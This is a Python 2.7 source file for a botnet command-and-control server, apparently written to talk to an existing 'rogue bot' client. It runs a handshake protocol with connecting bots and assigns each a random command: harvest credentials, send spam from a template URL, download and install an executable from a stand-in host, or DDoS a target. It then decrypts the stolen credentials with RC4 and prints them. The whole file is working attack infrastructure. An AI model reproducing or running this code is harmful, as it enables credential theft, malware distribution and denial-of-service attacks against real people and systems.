#!/usr/bin/python2.7
# server for the rogue bot client ( derived from the one written by Antoni
# Stevenet )

import socket
import os
import random
from Crypto.Cipher import ARC4

opsys = bytearray('linux', 'utf8')
hiByte = b'\x13'  # hey server!
hiOkByte = b'\x37'  # hi , whadup ?
recvCommand = b'\x14'  # could I get something to do.
command = b'\x39'  # sure man, here you go
received = b'\x16'  # thanks man, I got it.
recvconfirm = b'\x3a'  # cool, have fun with it
bye = b'\x17'  # well, see you then
byeok = b'\x3b'  # k, cya mate.
credentcmd = b'\x15'  # in case credentials gets called
cmdok = b'\xd1\x07\x00\x00'  # fukken nice cmd m8, kthxbye
ok = b'\x00'
getcredentialsbyte = b'\x00'
installbyte = b'\x01'
ddosbyte = b'\x02'
spambyte = b'\x03'
ddoslink = 'http://google.com'
spamlink = 'http://www.badware.com/spam.template'
installlink = 'http://www.badware.com/5.exe'
checksum = os.urandom(5)

#  PORT, HOST is set automatically ( localhost , since its a server )
PORT = 9999


def getChecksum():
    checksum = os.urandom(5)
    return checksum


def getNthByte(i, recv):
    return recv[(i - 1):i]


def getModifier(recv):
    return getNthByte(2, recv)


def getSessionId(recv):
    return recv[2:10]


def getRandomCommand():
    return random.choice(['getcredentials', 'spam', 'install', 'ddos'])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), PORT))
s.listen(10)


def process(clientsocket, recv, check):
    mod = getModifier(recv)

    if mod == hiByte:
        print('Started session: ' +
              " ".join("{:02x}".format(ord(c)) for c in str(getSessionId(recv))))
        # 8 for sessionId length, 1 for lengthlength
        length = len(hiOkByte) + 8 + 1 + len(bytearray(check))
        mssg = bytearray(chr(length), 'utf8') + hiOkByte + \
            getSessionId(recv) + check
        clientsocket.send(mssg)

    if mod == recvCommand:
        rCommand = getRandomCommand()

        if rCommand == 'getcredentials':
            length = len(command) + 8 + 1 + len(getcredentialsbyte)
            mssg = bytearray(chr(length), 'utf8') + \
                command + getSessionId(recv) + getcredentialsbyte
            clientsocket.send(mssg)

        if rCommand == 'spam':
            length = len(command) + 8 + 1 + len(spambyte) + len(spamlink)
            mssg = bytearray(chr(length), 'utf8') + command + \
                getSessionId(recv) + spambyte + bytearray(spamlink)
            clientsocket.send(mssg)

        if rCommand == 'install':
            length = len(command) + 8 + 1 + len(installbyte) + len(installlink)
            mssg = bytearray(chr(length), 'utf8') + command + \
                getSessionId(recv) + installbyte + bytearray(installlink)
            clientsocket.send(mssg)

        if rCommand == 'ddos':
            length = len(command) + 8 + 1 + len(ddosbyte) + len(ddoslink)
            mssg = bytearray(chr(length), 'utf8') + command + \
                getSessionId(recv) + ddosbyte + bytearray(ddoslink)
            clientsocket.send(mssg)

    if mod == received:
        length = len(recvconfirm) + 8 + 1 + len(ok)
        mssg = bytearray(chr(length), 'utf-8') + \
            recvconfirm + getSessionId(recv) + ok
        clientsocket.send(mssg)

    if mod == credentcmd:
        key = ARC4.new(getSessionId(recv))
        print('credentials: ' + key.decrypt(recv[10:]))

# loop
while True:
    (clientsocket, adress) = s.accept()
    check = getChecksum()
    while clientsocket:
        recv = clientsocket.recv(8192)

        if getModifier(recv) == bye:
            length = len(byeok) + 8 + 1
            mssg = bytearray(chr(length), 'utf-8') + byeok + getSessionId(recv)
            clientsocket.send(mssg)
            clientsocket.close()
            print('Ended session: ' +
                  " ".join("{:02x}".format(ord(c)) for c in str(getSessionId(recv))))
            break

        process(clientsocket, recv, check)
